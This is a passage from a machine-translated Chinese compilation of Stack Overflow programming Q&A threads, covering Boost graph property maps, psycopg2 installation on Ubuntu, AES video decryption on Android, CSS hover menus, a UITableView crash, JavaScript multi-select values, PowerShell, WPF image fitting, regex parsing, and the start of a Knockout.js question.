    printf("in edge: %d <- %d \n", current, in);
} 
```

`std::map`如果您的反向边缘属性非常稀疏，您可能希望使用（或`std::unordered_map`）之类的映射类来使用外部属性映射。您在邻接列表类模板中指定为 EdgeProperty 或 VertexProperty 的内容按图的每个顶点或边的值（种类）存储。如果您想要`std::map`行为（仅存储具有分配属性的子集），那么您可以简单地在邻接列表图外部执行此操作，属性映射的好处是它们不必对应于内部属性，这也很有用。所以，你可以这样做：

```
typedef std::map< tedge, tedge > treverse_edge_map;

treverse_edge_map rev_edges; 
```

如果您需要`rev_edges`用作 BGL 属性映射，则可以使用：

```
typedef boost::associative_property_map< treverse_edge_map > tbgl_reverse_edge_map;

tbgl_reverse_edge_map bgl_rev_edges = boost::make_assoc_property_map(rev_edges); 
```

但是，当然，一旦它是 BGL 样式的属性映射，您就不能再使用“查找”机制来确定是否为给定边设置了属性。

# python - 在 Ubuntu 上安装 psycopg2

> ID：11583714
> 
> 赞同：57
> 
> 时间：2012-07-20T16:49:41.130
> 
> 标签：python, postgresql, ubuntu

我正在尝试在 Ubuntu 12.04 上安装 python postgres 客户端模块。指导是执行以下操作：

```
apt-get install python-psycopg2 
```

但是，`apt`说找不到包裹。
我很想通过`apt`. 这是我可以安装的另一个软件包的一部分吗？

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2014-09-15T19:31:12.983

这适用于 Ubuntu 12.04 和 15.10

如果未安装 pip：

```
sudo apt-get install python-pip 
```

接着：

```
sudo apt-get update
sudo apt-get install libpq-dev python-dev
sudo pip install psycopg2 
```

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2012-07-20T16:55:31.183

使用 Ubuntu 12.04 对我来说似乎工作正常：

```
jon@minerva:~$ sudo apt-get install python-psycopg2
[sudo] password for jon: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Suggested packages:
  python-psycopg2-doc
The following NEW packages will be installed
  python-psycopg2
0 upgraded, 1 newly installed, 0 to remove and 334 not upgraded.
Need to get 153 kB of archives. 
```

**你到底得到了什么错误？**- 仔细检查你的 psycopg 拼写是否正确 - 这通常是一个陷阱......而且运行一个`apt-get update`来确保你的 repo 永远不会有坏处。已是最新。

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2019-05-23T21:57:15.230

利用

```
sudo apt-get install python3-psycopg2 
```

对于 Python3 )

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2020-11-24T07:48:16.213

这对我有用：

```
pip install psycopg2-binary 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2018-10-05T13:29:45.873

我更新了我`requirements.txt`的， `psycopg2==2.7.4 --no-binary=psycopg2` 以便它在源代码上构建二进制文件

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2021-05-18T13:00:45.410

根据官方文档[https://www.psycopg.org/install/](https://www.psycopg.org/install/)

```
sudo apt install python3-dev libpq-dev
pip install psycopg2 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-12-13T08:15:51.243

如果您使用的是 virtualenv，我更喜欢使用 pip：

1.  `apt install libpython2.7 libpython2.7-dev`
2.  `pip install psycopg2`

# android - 无法在 Android 上使用 AES 密码读取加密视频

> ID：11583719
> 
> 赞同：1
> 
> 时间：2012-07-20T16:50:04.763
> 
> 标签：android, video, encryption, aes

我必须在 Android 设备上阅读加密视频。

[我使用http://elonen.iki.fi/code/nanohttpd/](http://elonen.iki.fi/code/nanohttpd/)创建了一个 localhost 服务器，它以一种非常简单的方式实现了这一点。

我用它来阅读未加密的视频，但我一直在阅读加密的视频。（我加密视频没有任何麻烦，只是为了阅读它）

我尝试了以下方法：

1-使用简单的“AES”加密视频，当我尝试用我的服务器读取它时，我看到流媒体开始（我看到我的服务器在不同范围内回答 3 次）。3 次后，播放器说无法阅读视频。

2-使用“AES/CTR/NoPadding”加密视频：在这种情况下，我看到我的服务器提供了第一个范围，并且一次又一次地运行，但没有视频显示。

我尝试使用 CTR16 获取 16 位块，并使用 32ko 的缓冲区读取它们。那是行不通的。

（PS：我用我的方法解密图片没问题）

这是我的 crypt 方法：

```
public static InputStream getUncryptInputStream(InputStream is, String pass, final long dataLen) throws Exception{
        SecretKeySpec key = new SecretKeySpec(getRawKey(pass.getBytes()), "AES");
        Cipher mCipher = Cipher.getInstance("AES/CTR/NoPadding");
        mCipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
        if(dataLen==-1){
            return new CipherInputStream(is, mCipher);
        }else{
            return new CipherInputStreamWithDataLen(is, mCipher, dataLen);
        }
}

public static OutputStream getCryptOutputStream(OutputStream os, String pass) throws Exception{
    SecretKeySpec key = new SecretKeySpec(getRawKey(pass.getBytes()), "AES");

    Cipher mCipher = Cipher.getInstance("AES/CTR/NoPadding");
    mCipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);

    return new CipherOutputStream(os, mCipher);

}

private static byte[] getRawKey(byte[] seed) throws Exception {
    KeyGenerator kgen = KeyGenerator.getInstance("AES");
    SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
    sr.setSeed(seed);
    kgen.init(128, sr); // 192 and 256 bits may not be available
    SecretKey skey = kgen.generateKey();
    byte[] raw = skey.getEncoded();
    return raw;
} 
```

和`CipherInputStreamWithData`我创建的，因为可用的方法总是`0`以正常返回`CipherInputStreamWithData`：

```
import java.io.IOException;
import java.io.InputStream;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;

public class CipherInputStreamWithDataLen extends CipherInputStream{

    int dataLen;

    public CipherInputStreamWithDataLen(InputStream is, Cipher mCipher, long dataLen) {
        super(is, mCipher);
        this.dataLen = (int)dataLen;
        // TODO Auto-generated constructor stub
    }

    public int available() throws IOException{
        return dataLen;
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-24T12:33:18.853

问题是由于 CipherInputStream 跳过方法。

1.  由于密码加密，您必须小心跳过直到最后一个 cipherBlock 然后解密最后一个 +1 cupherblock 以获得您需要写入 BufferedOutputStream 的几个额外字节
2.  如果 CipherInputStream 的 "available" 方法返回的值小于要跳过的字节数，则 skip 方法将跳过的最大字节数将等于 "available" 方法返回的值。

一般评论：在视频开始之前，使用大型 BufferedInputStream 大约需要 10 秒。有人建议使用 NDK 以原生方式对 AES 进行编码。为了我的需要，我只需编写一个简单的 XOR。

# javascript - 列表项中的翻转效果（不在图像上）

> ID：11583720
> 
> 赞同：0
> 
> 时间：2012-07-20T16:50:06.953
> 
> 标签：javascript, html, css

我正在我的网站上创建一个菜单，上面写着：
**HTML 代码**

```
<ul id="menu">
<li><a href="index.aspx">Home</a></li>
<li><a href="about.aspx">About</a></li>
<li><a href="sample.aspx">Sample</a></li>
</ul> 
```

**CSS 代码**

```
ul#menu li a:link,ul#menu li a:visited {color:#333333;text-decoration:none;}
ul#menu li a:hover,ul#manu li a:active {color:#a61607;text-decoration:none;} 
```

在每个列表项的悬停时，我想在悬停时显示一个图像（图像是这样的，它出现在每个列表项的文本边界处）。这意味着出现的图像不必出现在文本上，也不必替换。它只是在文本的一侧移动，并在悬停结束时消失。
对于每个列表项，都有一个单独的图像关联用于翻转，并且必须在鼠标从列表项文本移开时消失。我不确定如何获得上述效果，并且我遵循的所有链接都是在翻转时更改图像的指南。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:55:41.333

您在每个链接之后的列表项中添加一个图像。您`display: none;`在图像上进行设置，然后您可以在悬停时使用`ul#menu li:hover img {display: inline-block}`

演示：[http ://dabblet.com/gist/3151894](http://dabblet.com/gist/3151894)

HTML 变得简单：

```
<ul id="menu">
    <li><a href="index.aspx">Home</a><img src="imghome.png"></li>
    <li><a href="about.aspx">About</a><img src="imgabout.png"></li>
    <li><a href="sample.aspx">Sample</a><img src="imgsample.png"></li>
</ul> 
```

在 CSS 中，我只添加了：

```
#menu li img {
    width: 15px;
    display: none;
}
#menu li:hover img { display: inline-block; } 
```

**编辑**：或者，可以使用显示图像

```
#menu a:hover + img { display: inline-block; } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:00:58.347

你可以这样做：

```
<ul id="menu">
<li><a id="firstLi" href="index.aspx">Home</a></li>
<li><a id="secondLi" href="about.aspx">About</a></li>
<li><a id="thirdLi" href="sample.aspx">Sample</a></li>
</ul>

a#firstLi:hover {background: url('images/image1.png')}
a#secondLi:hover {background: url('images/image2.png')}
a#thirdLi:hover {background: url('images/image3.png')} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:04:57.843

这是CSS：

```
ul#menu li a:link,ul#menu li a:visited {color:#333333;text-decoration:none;}
ul#menu li a:hover,ul#manu li a:active {color:#a61607;text-decoration:none;}
ul#menu li img {display: none;}
ul#menu li:hover img {display: inline-block;}​ 
```

我对所有三个链接都使用了相同的图像，搜索了一张要使用的测试图像。显然，您将使用您想要的任何图像。

```
<ul id="menu">
<li>
    <a href="index.aspx">
        Home
        <img src="http://icons.mysitemyway.com/wp-content/gallery/3d-glossy-green-orbs-icons-symbols-shapes/thumbs/thumbs_104626-3d-glossy-green-orb-icon-symbols-shapes-check-mark5-ps.png" />
    </a>
</li>
<li>
    <a href="about.aspx">
        About
        <img src="http://icons.mysitemyway.com/wp-content/gallery/3d-glossy-green-orbs-icons-symbols-shapes/thumbs/thumbs_104626-3d-glossy-green-orb-icon-symbols-shapes-check-mark5-ps.png" />
    </a>
</li>
<li>
    <a href="sample.aspx">
        Sample
        <img src="http://icons.mysitemyway.com/wp-content/gallery/3d-glossy-green-orbs-icons-symbols-shapes/thumbs/thumbs_104626-3d-glossy-green-orb-icon-symbols-shapes-check-mark5-ps.png" />
    </a>
</li> 
```

​​​​​​​​​​​​​​​</p>

**编辑以回应 op 的评论**

如果您希望在滚动锚点而不是 li 时显示图标/图像。您可以将第 4 行 css 更改为以下内容：

```
ul#menu a:hover img {display: inline-block;}​ 
```

但是，我不知道您必须使用哪些额外的 CSS 来调整元素的大小或位置。当我在 jsfiddle 中只运行这个 CSS 和 HTML 时，我遇到了一个“颤抖”的问题。当悬停在锚点上时，图像会显示，但它会重新定位所有其他元素，并且会发生一种悬停/非悬停。如果我添加以下 CSS 规则，使我的锚点在列表/列表项块元素中，我没有问题。

```
ul#menu li a {display: block;} 
```

此外，您还可以设置锚点或 li 元素的高度/宽度或填充以适应图像的尺寸。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T17:07:24.293

这是工作小提琴：http: [//jsfiddle.net/Q6CaM/](http://jsfiddle.net/Q6CaM/)

**HTML**

```
<ul id="menu">
    <li><a href="index.aspx">Home</a><img src="http://www.fmwconcepts.com/misc_tests/lena_label2.jpg" /></li>
<li><a href="about.aspx">About</a><img src="http://www.fmwconcepts.com/misc_tests/lena_label2.jpg" /></li>
<li><a href="sample.aspx">Sample</a><img src="http://www.fmwconcepts.com/misc_tests/lena_label2.jpg" /></li>
</ul>​ 
```

**CSS**

```
li{display:block; overflow:hidden;}
a{display:inline-block; float:left; margin:0 5px 0 0;}
img {display:none; position:absolute; }
li:hover img{display:inline-block;} 
```

# iphone - iphone UITable reloadRowsAtIndexPaths 很奇怪的问题

> ID：11583724
> 
> 赞同：5
> 
> 时间：2012-07-20T16:50:19.913
> 
> 标签：iphone, ios, uitableview

所以我试图用传入的图像更新一个单元格。我有一个协议，它在图像 DLing 完成时回调相应的方法。UITable 的来源是对象“会议”的 NSArray。每个会议都持有它的表格单元格的 indexPath，我在 -

```
(UITableViewCell *)tableView:(UITableView *)_tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    Meeting * meeting = [tableDataSource objectAtIndex:indexPath.row];
... cell's init code
    meeting.cellPath = indexPath; // also tried [indexPath copy];
...
} 
```

问题是当我尝试使用存储的 IndexPath 更新单元格时，我遇到了一个奇怪的错误，它说明了一些我没有的 NSMutable 数组：

```
2012-07-20 20:15:18.007 MyNewbieApp[5734:207] meeting.cellPath =  [row = 2,section = 0]
2012-07-20 20:15:18.705 MyNewbieApp[5734:207] meeting.cellPath =  [row = 4,section = 0]
2012-07-20 20:15:18.728 MyNewbieApp[5734:207] meeting.cellPath =  [row = 5,section = 0]
2012-07-20 20:15:18.730 MyNewbieApp[5734:207] downloadDidFinishDownloading <NSIndexPath 0x79456f0> 2 indexes [0, 5]
2012-07-20 20:15:18.732 MyNewbieApp[5734:207] *** Terminating app due to uncaught exception 'NSRangeException', reason: '*** -[NSMutableArray objectAtIndex:]: index 3 beyond bounds [0 .. 2]'
*** Call stack at first throw:
(
    0   CoreFoundation                      0x02c70b99 __exceptionPreprocess + 185
    1   libobjc.A.dylib                     0x02a6540e objc_exception_throw + 47
    2   CoreFoundation                      0x02c66695 -[__NSArrayM objectAtIndex:] + 261
    3   UIKit                               0x00556327 -[_UITableViewUpdateSupport(Private) _setupAnimationsForExistingVisibleCells] + 264
    4   UIKit                               0x00555b9b -[_UITableViewUpdateSupport initWithTableView:updateItems:oldRowData:newRowData:oldRowRange:newRowRange:context:] + 436
    5   UIKit                               0x003ab5d6 -[UITableView(_UITableViewPrivate) _updateWithItems:withOldRowData:oldRowRange:newRowRange:context:] + 1323
    6   UIKit                               0x003a7f03 -[UITableView(_UITableViewPrivate) _endCellAnimationsWithContext:] + 9179
    7   UIKit                               0x003974d3 -[UITableView reloadRowsAtIndexPaths:withRowAnimation:] + 56
    8   MyNewbieApp                         0x00017354 -[MeetingsVC downloadDidFinishDownloading:] + 174
    9   MyNewbieApp                         0x000173a6 -[MeetingsVC download:didFailWithError:] + 43
    10  MyNewbieApp                         0x00010e5f -[Meeting image] + 317
    11  MyNewbieApp                         0x00016f49 -[MeetingsVC tableView:cellForRowAtIndexPath:] + 2141
    12  UIKit                               0x0039ed6f -[UITableView(UITableViewInternal) _createPreparedCellForGlobalRow:withIndexPath:] + 619
    13  UIKit                               0x00394e02 -[UITableView(UITableViewInternal) _createPreparedCellForGlobalRow:] + 75
    14  UIKit                               0x003a9774 -[UITableView(_UITableViewPrivate) _updateVisibleCellsNow:] + 1561
    15  UIKit                               0x003a17ec -[UITableView layoutSubviews] + 242
    16  QuartzCore                          0x02619481 -[CALayer layoutSublayers] + 177
    17  QuartzCore                          0x026191b1 CALayerLayoutIfNeeded + 220
    18  QuartzCore                          0x026122e0 _ZN2CA7Context18commit_transactionEPNS_11TransactionE + 302
    19  QuartzCore                          0x02612040 _ZN2CA11Transaction6commitEv + 292
    20  QuartzCore                          0x02642ebb _ZN2CA11Transaction17observer_callbackEP19__CFRunLoopObservermPv + 99
    21  CoreFoundation                      0x02c51f4b __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ + 27
    22  CoreFoundation                      0x02be6b27 __CFRunLoopDoObservers + 295
    23  CoreFoundation                      0x02bafce7 __CFRunLoopRun + 1575
    24  CoreFoundation                      0x02baf350 CFRunLoopRunSpecific + 208
    25  CoreFoundation                      0x02baf271 CFRunLoopRunInMode + 97
    26  GraphicsServices                    0x0318000c GSEventRunModal + 217
    27  GraphicsServices                    0x031800d1 GSEventRun + 115
    28  UIKit                               0x0033baf2 UIApplicationMain + 1160
    29  MyNewbieApp                         0x00002034 main + 102
    30  MyNewbieApp                         0x00001fc5 start + 53
)
terminate called after throwing an instance of 'NSException' 
```

所以它的索引数组越界异常。由于我没有任何具有 3 个元素的 NSMutableArray。我所有的阵列都大得多。啊，异常来自这里：

```
 - (void)downloadDidFinishDownloading:(Meeting *)meeting
    {
        NSLog(@"downloadDidFinishDownloading %@",meeting.cellPath);
        //NSLog(@"downloadDidFinishDownloading meeting.cellPath =  [row = %d,section = %d]",meeting.cellPath.row,meeting.cellPath.section);

        [self.tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:meeting.cellPath] withRowAnimation:UITableViewRowAnimationNone];
        meeting.delegate = nil;
    }

- (void)download:(Meeting *)meeting didFailWithError:(NSError *)error{
    [self downloadDidFinishDownloading:meeting];
} 
```

每次会议图像DLing完成时都会调用此回调方法。如果我只是用 reloadRowsAtIndexPaths 注释代码行 - 一切都很好。否则我会出错。它到底是什么？我花了很多时间但没用......我只是没有胶水是怎么回事......更奇怪的是，当我向上滚动表格的内容时，问题总是出现在第 5 个元素上：） . 第 5 个元素没有什么特别之处，我已经用另一个数据集尝试过，但问题仍然存在。

**更新**：错误/崩溃仅在代码回调该`download:(Meeting *)meeting didFailWithError`方法时发生。但它仍然具有相同的会议参数，我发送到`downloadDidFinishDownloading`. 我还尝试了以下操作：

```
 - (void)download:(Meeting *)meeting didFailWithError:(NSError *)error{
[self.tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:meeting.cellPath] withRowAnimation:UITableViewRowAnimationNone];
            meeting.delegate = nil;
} 
```

所以应用程序现在只在 reloadRowsAtIndexPaths 的这个方法中崩溃。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:15:39.173

我相信您的数据源有问题。所有的代码都很难说问题出在哪里。虽然我有一个提示给你，这可能对你有用。在 Xcode 的断点选项卡上，单击左下角的加号按钮，会弹出一个窗口，单击完成。

再次运行您的应用程序，现在当它崩溃时，它会为您指出应用程序在代码中的哪个位置被破坏...

我不知道你是否已经拥有它..但仍然！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:01:49.070

一个想法是您可能需要更新数据源对象“tableDataSource”，尤其是部分中的行数

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section 
```

编辑 ：

进一步阅读您的问题，您能否复制粘贴 cellForRowAtIndexPath 中的“可重用单元格”部分（实际上是整个方法，我猜问题就在那里）

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-09-26T04:09:38.213

尝试这个：

```
[self.tableView beginUpdates];
[self.tableView reloadRowsAtIndexPaths:[NSArray arrayWithObject:meeting.cellPath] withRowAnimation:UITableViewRowAnimationNone];
[self.tableView endUpdates] 
```

# javascript - 在Javascript中获取多选标签中的选定值

> ID：11583728
> 
> 赞同：17
> 
> 时间：2012-07-20T16:50:54.290
> 
> 标签：javascript

我有以下代码

```
function searchFlights() {
    var select1 = document.getElementById("airports-select-1");
    var selected1 = [];
    while(select1.selectedIndex != -1) {
      if(select1.selectedIndex != 0) selected1.push(select1.options[select1.selectedIndex].value); 
      select1.options[select1.selectedIndex].selected = false;
   }

   console.log(selected1);
} 
```

这工作正常，但正如您从代码中看到的这一行：

```
select1.options[select1.selectedIndex].selected = false; 
```

正在取消选择该值。

现在，我不想取消选择这些值。如果我在代码中取消注释该行，代码将永远运行。

是否有任何更精致和复杂的解决方案可以使用 Javascript 从选择标签中检索多个值？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-07-20T17:10:31.937

这不可以吗：

```
function searchFlights() {
    var select1 = document.getElementById("airports-select-1");
    var selected1 = [];
    for (var i = 0; i < select1.length; i++) {
        if (select1.options[i].selected) selected1.push(select1.options[i].value);
    }
    console.log(selected1);
}​ 
```

```
function searchFlights() {
    var select1 = document.getElementById("airports-select-1");
    var selected1 = [];
    for (var i = 0; i < select1.length; i++) {
        if (select1.options[i].selected) selected1.push(select1.options[i].value);
    }
    console.log(selected1);
}
```

```
<form method="post">
  <select name="Select1" multiple="multiple" size="8" id="airports-select-1" onblur="searchFlights()" ;>
    <option>aaa</option>
    <option>bbb</option>
    <option>ccc</option>
    <option>ddd</option>
    <option>eee</option>
  </select>
</form>
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/pQD8g/)**

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2018-02-01T21:49:14.770

2018 年更新：

*   如果`<select>`元素包含`selectedOptions`属性，请使用该集合。唯一仍在广泛流通但不支持此功能的浏览器是 IE（任何版本）。Edge 确实支持它。

*   如果这不受支持，@j08691 的回答仍然是正确的，但作为性能优化，您可以开始迭代选项`selectedIndex`而不是`0`. 这是第一个选择的选项的索引，或者`-1`如果没有选择任何选项。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2019-12-30T22:28:17.530

对于那些喜欢更实用风格的人的另一种方法：

```
selections = Array.from(selectBox.options).filter(o => o.selected).map(o => o.value) 
```

或者

```
selections = Array.from(selectBox.selectedOptions).map(o => o.value) 
```

# powershell - 试图在powershell中传递文件及其路径

> ID：11583734
> 
> 赞同：0
> 
> 时间：2012-07-20T16:51:27.573
> 
> 标签：powershell

在我说之后，我正在尝试将目录中的特定（* .csv）文件及其整个路径放入变量中`$files=Get-Childitem -path "E:\testimport\inbound\treas\" -filter "*.csv"`。

说，我有 csv 文件，如`E:\testimport\inbound\treas\myfile1.csv,myfile2.csv..`

我将如何返回 `E:\testimport\inbound\treas\myfile1.csv` `E:\testimport\inbound\treas\myfile2.csv` `E:\testimport\inbound\treas\myfile12.csv`一个单独的变量

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:03:45.803

`FullName`从对象中获取属性

```
Get-ChildItem -Path \temp -Filter *.cvs | Select-Object -Property FullName 
```

# wpf - 使用复选框滚动/适合图像

> ID：11583735
> 
> 赞同：2
> 
> 时间：2012-07-20T16:51:29.110
> 
> 标签：wpf, xaml, layout, scrollview

我想显示图像并添加复选框“适合屏幕” - 使图像适合可见区域。

为了使图像适合可见区域，我使用以下 xaml 片段：

```
<Image Source="{Binding Picture}" Stretch="Uniform"/> 
```

要禁用拟合并添加滚动，我使用以下 xaml 片段：

```
<ScrollViewer VerticalScrollBarVisibility="Auto" 
              HorizontalScrollBarVisibility="Auto">
    <Image Source="{Binding Picture}" Stretch="None"/>
</ScrollViewer> 
```

问题是如何将拟合和实际尺寸与滚动条结合起来，并使用复选框在两种状态之间切换？

**更新：**

问题是 code`Image/@Stretch=Uniform`的行为方式与`Image/@Stretch=None`inside相同`<ScrollViewer>`。在这两种情况下都可以看到滚动，并且图像以其实际大小显示。

在细节。编码

```
<ScrollViewer VerticalScrollBarVisibility="Auto" 
              HorizontalScrollBarVisibility="Auto">
    <Image Source="{Binding Picture}" Stretch="Uniform" />
</ScrollViewer> 
```

工作方式与

```
<ScrollViewer VerticalScrollBarVisibility="Auto" 
              HorizontalScrollBarVisibility="Auto">
    <Image Source="{Binding Picture}" Stretch="None" />
</ScrollViewer> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:14:41.543

创建一个值转换器，将复选框的选中状态转换为`Stretch.Unfiorm`或`Stretch.None`。

```
public class StretchValueConverter : IValueConverter
{
  public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
  {
    return (bool)value ? Stretch.Uniform : Stretch.None;
  }

  public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
  {
    return value.Equals(Stretch.Uniform);
  }

} 
```

然后在您的 XAML 中，您可以执行以下操作：

```
<Window.Resources>

  <local:StretchValueConverter x:Key="StretchValueConverter" />

</Window.Resources>

<CheckBox x:Name="FitToScreen" />

<ScrollViewer VerticalScrollBarVisibility="Auto" 
              HorizontalScrollBarVisibility="Auto">
    <Image Source="{Binding Picture}" Stretch="{Binding ElementName=FitToScreen Converter={StaticResource StretchValueConverter}, Path=Checked"/>
</ScrollViewer> 
```

**更新**

您还需要设置`HorizontalScrollBarVisibility`并`VerticalScrollBarVisibilty`强制`Disabled`滚动查看器的内容不超过边界。您可以使用另一个转换器或样式来监听 Checkbox.Checked 属性。

```
<Window x:Class="Overflow.Examples.Wpf.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto" />
            <RowDefinition Height="*" />
        </Grid.RowDefinitions>

        <CheckBox x:Name="FitToScreen" Grid.Row="0" Content="Fit to screen" />

        <ScrollViewer Grid.Row="1">
            <Image Source="{Binding Picture}">
                <Image.Style>
                    <Style TargetType="Image">
                        <Setter Property="Stretch" Value="None" />
                        <Style.Triggers>
                            <DataTrigger Binding="{Binding ElementName=FitToScreen, Path=IsChecked}" Value="True">
                                <Setter Property="Stretch" Value="Uniform" />
                            </DataTrigger>
                        </Style.Triggers>
                    </Style>
                </Image.Style>
            </Image>

            <ScrollViewer.Style>
                <Style TargetType="ScrollViewer">
                    <Setter Property="HorizontalScrollBarVisibility" Value="Auto" />
                    <Setter Property="VerticalScrollBarVisibility" Value="Auto" />
                    <Style.Triggers>
                        <DataTrigger Binding="{Binding ElementName=FitToScreen, Path=IsChecked}" Value="True">
                            <Setter Property="HorizontalScrollBarVisibility" Value="Disabled" />
                            <Setter Property="VerticalScrollBarVisibility" Value="Disabled" />
                        </DataTrigger>
                    </Style.Triggers>
                </Style>
            </ScrollViewer.Style>
        </ScrollViewer>
    </Grid>
</Window> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:28:47.803

您只能使用应用于图像样式的触发器在 xaml 中执行此操作 -

```
<CheckBox x:Name="FitToScreen" />    
    <ScrollViewer VerticalScrollBarVisibility="Auto" 
                  HorizontalScrollBarVisibility="Auto">
        <Image Source="{Binding Picture}">
           <Image.Style>
              <Style TargetType="Image">
                 <Setter Property="Stretch" Value="None"/>
                 <Style.Triggers>
                     <Trigger Property="IsChecked" SourceName="FitToScreen" Value="True">
                        <Setter Property="Stretch" Value="Uniform"/>
                     </Trigger>
                 </Style.Triggers>
              </Style>
           </Image.Style>
        </Image>
    </ScrollViewer> 
```

**更新**

作为一种解决方法，您可以将两个图像放在一个网格中，并根据复选框选中状态来使用其可见性，如下所示 -

```
<CheckBox x:Name="FitToScreen"/> 
<Grid>
  <Grid.Resources>
     <BooleanToVisibilityConverter x:Key="BooleanToVisibilityConverter"/>
  </Grid.Resources>
  <Image Source="{Binding Picture}" Stretch="Uniform"
         Visibilty="{Binding IsChecked, ElementName=FitToScreen, Converter={StaticResource BooleanToVisibilityConverter}}"/>
  <ScrollViewer VerticalScrollBarVisibility="Auto" 
              HorizontalScrollBarVisibility="Auto">
    <Image Source="{Binding Picture}" Stretch="None"/>
  <ScrollViewer.Style>
    <Style TargetType="Image">
       <Setter Property="Visibility" Value="Visible"/>
         <Style.Triggers>
            <Trigger Property="IsChecked" SourceName="FitToScreen" Value="True">
               <Setter Property="Visibility" Value="Collapsed"/>
            </Trigger>
         </Style.Triggers>
     </Style>
  </ScrollViewer.Style>
  </ScrollViewer>
</Grid> 
```

# regex - 正则表达式和获取部分字符串

> ID：11583736
> 
> 赞同：-3
> 
> 时间：2012-07-20T16:51:31.300
> 
> 标签：regex

我有很多字符串

```
blip createBlip ( float x, float y, float z, [int icon=0, int size=2, int r=255, int g=0, int b=0, int a=255, int ordering=0, float visibleDistance=99999.0, visibleTo = getRootElement()] )

float float float getElementRotation ( element theElement [, string rotOrder = "default" ] ) 
```

我需要得到这个字符串的**一部分，比如**

```
array(
[1] = blip
[2] = createBlip
[3] = x
[4] = y
[5] = z
) 
```

和

```
array(
[1] = blip createBlip
[2] = float x
[3] = float y
[4] = float z
[5] = int icon=0
[6] = int size=2
[7] = int r=255 
```

...

可以用正则表达式做到这一点吗？如果是，如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T18:16:50.237

我认为您可以使用正则表达式组和 javascript String.match() 方法来做到这一点，例如（第一个字符串）：

```
var string = "blip createBlip ( float x, float y, float z, [int icon=0, int size=2, int r=255, int g=0, int b=0, int a=255, int ordering=0, float visibleDistance=99999.0, visibleTo = getRootElement()] )";

var result = string.match(/((?:(?:\w+)\s?)+?)\(?\[?((?:(?:(?:(?:\s?\w+)+))\,)+)\s?\[((?:(?:(?:\s?=?\.?\(?\)?\w?)+)\,?)+)\]\s?\)/); 
```

结果将是一个数组：

```
["blip createBlip ( float x, float y, float z, [int icon=0, int size=2, int r=255, int g=0, int b=0, int a=255, int ordering=0, float visibleDistance=99999.0, visibleTo = getRootElement()] )", "blip", "createBlip", " float x, float y, float z,", "int icon=0, int size=2, int r=255, int g=0, int b=0, int a=255, int ordering=0, float visibleDistance=99999.0, visibleTo = getRootElement()"] 
```

现在，result[0] 包含完全匹配，但 result[1]..result[n]（n - 捕获组的数量）包含带有 () 和 [] 括号内的参数的字符串。现在您可以将“float x,float y,float z,”除以“,”来仅获取参数。

您应该尝试概括该模式，以便它匹配第二个字符串和您拥有的其他字符串。它看起来有点疯狂，但这是我现在想到的唯一解决方案......

# asp.net-mvc - Knockoutjs Mapping fromJS 保持方法

> ID：11583739
> 
> 赞同：5
> 
> 时间：2012-07-20T16:52:06.140
> 
> 标签：asp.net-mvc, knockout.js, knockout-mapping-plugin

我使用 KnockoutJs，它很棒，但我需要一件事，但我想不通。

1.  我发出一个返回 JSON 数据的 get 请求。与我的 Knockout ViewModel 相同的属性。
2.  我使用映射插件将我的 JSon 结果转换为 Knockout viewModel。

这很好，但是，当然，我失去了在淘汰视图模型中定义的方法。

### 如何防止这种情况，以便我可以使用映射并保留我的方法？

非常感谢！

# 更新

这只是一个示例。也许有一些语法错误，但它应该显示我正在尝试做的事情。

## 我的 JavaScript

```
var MyViewModel = function () {
    var self = this;

    self.id = ko.observable();
    self.subModels = ko.observableArray();

    self.doSomething = function () {
        alert("Hello from " + self.id());
    };
};

var MySubViewModel = function () {
    var self = this;

    self.id = ko.observable();

    self.doSomething = function () {
        alert("Hello from " + self.id());
    };
}; 
```

## 我的 C# 模型

```
public class MyViewModel
{
    public int Id { get; set; }
    public List<MySubViewModel> SubModels { get; set; }
}

public class MySubViewModel
{
    public int Id { get; set; }
} 
```

## 我的服务器结果

```
return new MyViewModel
        {
            Id = 1,
            SubModels = new List<MySubViewModel>
                                {
                                new MySubViewModel { Id = 1 },
                                new MySubViewModel { Id = 2 }
                                }
        }; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T17:48:20.153

